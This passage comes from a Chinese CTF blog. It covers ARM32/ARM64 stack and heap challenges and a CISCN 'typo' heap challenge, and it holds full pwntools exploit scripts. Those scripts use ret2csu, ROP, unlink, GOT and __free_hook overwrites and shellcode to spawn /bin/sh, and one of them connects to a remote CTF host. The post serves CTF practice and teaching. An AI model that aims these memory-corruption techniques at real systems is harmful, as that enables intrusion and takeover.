p32(<span class="number">0</span>) <span class="comment">#R9</span></span><br><span class="line">payload += p32(csu_call + <span class="number">1</span>) <span class="comment">#Thumb模式，bit0 = 1</span></span><br><span class="line"></span><br><span class="line">payload += p32(<span class="number">0</span>)*<span class="number">0x7</span></span><br><span class="line">payload += p32(bss) <span class="comment">#执行shellcode</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;dump:&#x27;</span>,payload)</span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;Dump again (y/n):&#x27;</span>,<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line">sh.sendline(asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="task"><a href="#task" class="headerlink" title="task"></a>task</h3><p>64位arm的ret2csu</p>
<p>程序源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> name[<span class="number">0x60</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fun</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;what do you want to say:&quot;</span>);</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">        read(<span class="number">0</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;welcome to haivk&#x27;s class&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;what is your name:&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>,name,<span class="number">0x60</span>);</span><br><span class="line">        fun();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>思路（根据前面arm64知识中的栈结构可知，我们溢出只能修改调用函数的返回地址）：</p>
<ol>
<li>第一次输入放入shellcode和mprotect()的地址</li>
<li>第二次输入栈溢出，布局寄存器的值</li>
<li>getshell</li>
</ol>
<p><img data-src="/../images/image-20250716181619125.png" alt="image-20250716181619125"></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;aarch64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(argv=[&#x27;qemu-aarch64&#x27;,&#x27;./task&#x27;])</span></span><br><span class="line">sh = process(argv=[<span class="string">&#x27;qemu-aarch64&#x27;</span>,<span class="string">&#x27;-g&#x27;</span>,<span class="string">&#x27;1234&#x27;</span>,<span class="string">&#x27;./task&#x27;</span>])</span><br><span class="line">bss = <span class="number">0x0000000000490440</span></span><br><span class="line">read_addr = <span class="number">0x0000000000416930</span></span><br><span class="line">mprotect_addr = <span class="number">0x0000000000417370</span></span><br><span class="line">csu_ld = <span class="number">0x0000000000400DC4</span></span><br><span class="line">csu_call = <span class="number">0x0000000000400DA4</span></span><br><span class="line"></span><br><span class="line">payload =  p64(mprotect_addr) + asm(shellcraft.sh())</span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;name:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(csu_ld)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(csu_call) <span class="comment">#x29 x30</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(bss) <span class="comment">#x19 x20</span></span><br><span class="line">payload += p64(<span class="number">0x60</span>) + p64(<span class="number">0x7</span>) <span class="comment">#x21 x22</span></span><br><span class="line">payload += p64(<span class="number">1</span>) + p64(bss) <span class="comment">#x23 x24</span></span><br><span class="line"><span class="comment">#x24(x20,x21,x22) == mprotect(bss, 0x60, 7) == x3(w0,x1,x2)</span></span><br><span class="line"><span class="comment">#x29 x30</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(bss + <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;say:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwnme"><a href="#pwnme" class="headerlink" title="pwnme"></a>pwnme</h3><p>arm的堆题</p>
<p>核心就是看装载的libc的是哪种，若是glibc那就正常打，还有其它的libc如uClibc它和glibc内存分配规则一样，还有其他的就根据libc的chunk分配规则来做题</p>
<p>下面是一道arm 堆题的exp，漏洞是堆溢出，手法：unlink，总统看上去和glibc的脚本一样</p>
<p>所以arm的堆题就是换汤不换药，arm架构主要还是栈的问题</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(argv=[&#x27;qemu-arm&#x27;,&#x27;-g&#x27;,&#x27;1234&#x27;,&#x27;-L&#x27;,&#x27;./&#x27;,&#x27;./pwnme&#x27;])</span></span><br><span class="line">sh = process(argv=[<span class="string">&#x27;qemu-arm&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;./&#x27;</span>,<span class="string">&#x27;./pwnme&#x27;</span>])</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwnme&#x27;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libuClibc-1.0.34.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">   sh.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">b&#x27;Length:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   sh.sendafter(<span class="string">b&#x27;Tag:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">b&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">   sh.sendlineafter(<span class="string">b&#x27;Length:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   sh.sendafter(<span class="string">b&#x27;Tag:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">b&#x27;Tag:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Exit</span>():</span><br><span class="line">   sh.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x80</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">heap_ptr0_addr = <span class="number">0x0002106C</span></span><br><span class="line">payload = p32(<span class="number">0</span>) + p32(<span class="number">0x81</span>)</span><br><span class="line">payload += p32(heap_ptr0_addr-<span class="number">0xC</span>) + p32(heap_ptr0_addr-<span class="number">0x8</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p32(<span class="number">0x80</span>) + p32(<span class="number">0x88</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x88</span>,payload)</span><br><span class="line"><span class="comment">#unlink</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x80</span>,p64(<span class="number">0</span>) + p32(<span class="number">0x8</span>) + p32(puts_got) + p32(<span class="number">0x8</span>) + p32(free_got) + p32(<span class="number">0x8</span>) + p32(<span class="number">0x00021068</span>))</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;0 : &#x27;</span>)</span><br><span class="line">uclibc_base = u32(sh.recv(<span class="number">4</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = uclibc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = uclibc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;uclibc_base=&#x27;</span>,<span class="built_in">hex</span>(uclibc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system_addr=&#x27;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;binsh_addr=&#x27;</span>,<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x4</span>,p32(system_addr))</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x8</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h2><h3 id="pwn346"><a href="#pwn346" class="headerlink" title="pwn346"></a>pwn346</h3><p>arm32栈溢出，有后门函数</p>
<p>漏洞函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// r3</span></span><br><span class="line">  _BYTE buf[<span class="number">24</span>]; <span class="comment">// [sp+4h] [bp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">20</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter your input: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x64u</span>);<span class="comment">//溢出</span></span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里发现一些小技巧</p>
<p><strong>关于arm文件调试：</strong></p>
<ul>
<li>直接用exp.py脚本调试，就是用pwntools的库配合gdb来调试，这样的话就会显示出bl #read@plt 这样的看着比较清晰、舒服，而且直接gdb运程监听会进入到这个函数内部（个人感觉比较无用）</li>
<li>arm也可以用<code>cyclic -l 字符</code>这样的方式来测试溢出长度，但还是要以实际调试的为准</li>
</ul>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-07-17 11:01:27</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;arm&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28163</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(argv=[<span class="string">&#x27;qemu-arm&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/usr/arm-linux-gnueabihf&#x27;</span>,<span class="string">&#x27;./pwn&#x27;</span>])</span><br><span class="line">    <span class="comment">#p = process(argv=[&#x27;qemu-arm&#x27;,&#x27;-g&#x27;,&#x27;1234&#x27;,&#x27;-L&#x27;,&#x27;/usr/arm-linux-gnueabihf&#x27;,&#x27;./pwn&#x27;])</span></span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"><span class="comment">#libc = elf.libc</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(target=(&quot;localhost&quot;, 1234), exe=elf.path,gdbscript=&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># b *0x0001054C</span></span><br><span class="line"><span class="comment"># b *0x00010550</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">hs256   = <span class="keyword">lambda</span> data               :sha256(<span class="built_in">str</span>(data).encode()).hexdigest()</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    :u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">l64     = <span class="keyword">lambda</span>                    :u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data               :<span class="built_in">int</span>(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">backdoor = elf.symbols[<span class="string">&#x27;backdoor&#x27;</span>]</span><br><span class="line">sla(<span class="string">b&#x27;Please enter your input:&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span> + p32(backdoor))</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h3 id="pwn347"><a href="#pwn347" class="headerlink" title="pwn347"></a>pwn347</h3><p>arm32，rop</p>
<figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line">le0n:pwn347/ $ checksec pwn                                                                               </span><br><span class="line">[*] <span class="string">&#x27;/home/le0n/challenge/ctfshow/pwn347/pwn&#x27;</span></span><br><span class="line">    Arch:       arm-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x10000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>

<p>漏洞依旧是栈溢出，只不过这次要进行arm32的ret2libc</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  logo();</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ropper查询gadgets，这个pop {r3, pc};可以和下面的万能gadget配合使用</p>
<figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line">(pwn/ELF/ARM)&gt; search pop</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: pop</span><br><span class="line">                                                                                                                                                                     [INFO] File: pwn</span><br><span class="line">0x00010548: pop &#123;r11, pc&#125;;</span><br><span class="line">0x000103a4: pop &#123;r3, pc&#125;;</span><br><span class="line">0x00010500: pop &#123;r4, pc&#125;;</span><br><span class="line">0x000106bc: pop &#123;r4, r5, r6, r7, r8, r9, r10, pc&#125;;</span><br><span class="line">0x000106bc: pop &#123;r4, r5, r6, r7, r8, r9, r10, pc&#125;; muleq r1, r8, r8; muleq r1, r0, r8; bx lr;</span><br><span class="line">0x000104f0: popne &#123;r4, pc&#125;; bl 0x47c; mov r3, <span class="comment">#1; strb r3, [r4]; pop &#123;r4, pc&#125;;</span></span><br></pre></td></tr></table></figure>

<p>查阅一些资料发现前面一直用的csu的gadgets好像可以充当我想要的gadgets，事实也是这样csu的这段gadget被称为万能gadget。</p>
<p>思路：</p>
<ol>
<li>通过puts来泄露libc基地址（备用printf），程序要导回ctfshow()函数</li>
<li>计算system，bin&#x2F;sh</li>
<li>再溢出来执行system</li>
</ol>
<p>有思路开干，因为puts和syste都只有一个函数所以试一下这段：</p>
<p><img data-src="/../images/image-20250717155011131.png" alt="image-20250717155011131"></p>
<p>exp(只能打通本地，远程不知道那个libc，泄露的地址也查不出来，呜~~):</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">ctfshow = elf.symbols[<span class="string">&#x27;ctfshow&#x27;</span>]</span><br><span class="line">pop_r3_pc = <span class="number">0x000103a4</span></span><br><span class="line"><span class="comment"># csu_bl = 0x0001069C</span></span><br><span class="line">mov_r0r7_blxr3 = <span class="number">0x000106ac</span></span><br><span class="line">csu_pop = <span class="number">0x000106BC</span> <span class="comment">#只需要设置R7 = 参数、R6 = 1和R3 = got</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">132</span> + p32(csu_pop)</span><br><span class="line"><span class="comment"># payload += p32(0)*3 + p32(puts_got) #r7</span></span><br><span class="line">payload += p32(<span class="number">0</span>)*<span class="number">3</span> + p32(printf_got) <span class="comment">#r7</span></span><br><span class="line">payload += p32(<span class="number">0</span>)*<span class="number">3</span> + p32(pop_r3_pc) <span class="comment">#pc</span></span><br><span class="line">payload += p32(puts_plt) <span class="comment">#r3在栈上的</span></span><br><span class="line">payload += p32(mov_r0r7_blxr3)</span><br><span class="line">payload += p32(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload += p32(ctfshow)</span><br><span class="line">sla(<span class="string">b&quot;$ &quot;</span>,payload)</span><br><span class="line">puts_addr = uu32()</span><br><span class="line">leak(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>, libc_base)</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;system&#x27;</span>, system)</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">leak(<span class="string">&#x27;binsh&#x27;</span>, binsh)</span><br><span class="line"><span class="comment"># getshell</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">132</span> + p32(csu_pop)</span><br><span class="line">payload += p32(<span class="number">0</span>)*<span class="number">3</span> + p32(binsh) <span class="comment">#r7</span></span><br><span class="line">payload += p32(<span class="number">0</span>)*<span class="number">3</span> + p32(pop_r3_pc) <span class="comment">#pc</span></span><br><span class="line">payload += p32(system) <span class="comment">#r3在栈上的</span></span><br><span class="line">payload += p32(mov_r0r7_blxr3)</span><br><span class="line">sla(<span class="string">b&quot;$ &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h3 id="pwn349"><a href="#pwn349" class="headerlink" title="pwn349"></a>pwn349</h3><p>同pwn346一样，有后门写一下后门的地址到main()函数的x30即可</p>
<h3 id="pwn350"><a href="#pwn350" class="headerlink" title="pwn350"></a>pwn350</h3>]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>arm</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn&amp;&amp;ccb半决赛复现</title>
    <url>/2025/04/07/ciscn&amp;&amp;ccb%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="typo"><a href="#typo" class="headerlink" title="typo"></a>typo</h1><p>ubuntu20.04，glibc2.31</p>
<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目中用到的结构体：</p>
<p><img data-src="/../images/image-20250407195503012.png" alt="image-20250407195503012"></p>
<p><img data-src="/../images/image-20250407195533099.png" alt="image-20250407195533099"></p>
<p>其他函数就不看了，看一下有漏洞的函数（edit）：</p>
<p><img data-src="/../images/image-20250407195725965.png" alt="image-20250407195725965"></p>
<p>可以看到在 <code>snprintf((char *)chunklist[v1], (size_t)&quot;%lu&quot;, s, 8LL); </code>存在问题</p>
<p><code>snprintf </code>的函数原型为：<code>int snprintf(char *s, size_t maxlen, const char *format, ...)</code></p>
<p>题目将<code> (size_t)&quot;%lu&quot;</code> （即它的地址）作为了<code>maxlen</code>传入，<code>format</code> 为用户输入，于是这里同时存在格式化字符串漏洞和堆溢出漏洞</p>
<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><p>由于没有 show，没有什么直观的方法可以泄露 libc_base，不过见过的小伙伴一定可以第一实际想到用 _IO_2_1_stdout_ 进行泄露，在下文中，我也是这样实现的。</p>
<p>具体的利用步骤如下：</p>
<ul>
<li>利用堆溢出构造 chunk overlapping，接下来相当于可以实现double free（有的说是UAF，这里称呼为 A，B，并且 A，B 实际上为同一个 chunk）。</li>
<li>先将 A 放入 tcahebin，用堆溢出修改这个 chunk 大小，再放入 unsortedbin 中，这个时候，tcahebin 就残留了 main_arena 附近的地址。</li>
<li>再用堆溢出部分覆盖原 main_arena+96 地址为 _IO_2_1_stdout_ 附近地址，接下来就修改 _flag 为<code> 0xFBAD1800</code>， 将_IO_write_base 的地址末尾改为 00，即可泄露 libc。</li>
<li>有了 libc_base，后面就简单了，这里我改 __free_hook 为 system，接下来 getshell。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-04-07 20:46:31</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, ) </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line">gdb.attach(p,gdbscript = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    set debug-file-directory ./.debug/ </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line">menu = <span class="string">b&#x27;&gt;&gt; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">b&quot;New size of content: &quot;</span>,size)</span><br><span class="line">    sa(<span class="string">b&quot;What do you want to say: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(menu,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">##本地调试可以先 echo 0 &gt; /proc/sys/kernel/randomize_va_space 禁用 ASLR</span></span><br><span class="line"><span class="comment"># 或者 sysctl -w kernel.randomize_va_space=0</span></span><br><span class="line"><span class="comment"># 没有show, 基本是要想办法泄露libc, 有了堆溢出, 因此可以利用 overlapping</span></span><br><span class="line"><span class="comment"># 然后结合 unsortedbin 来爆破 _IO_2_1_stdout_ 的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. unlink 合并到 top chunk (overlapping)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0xf0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span 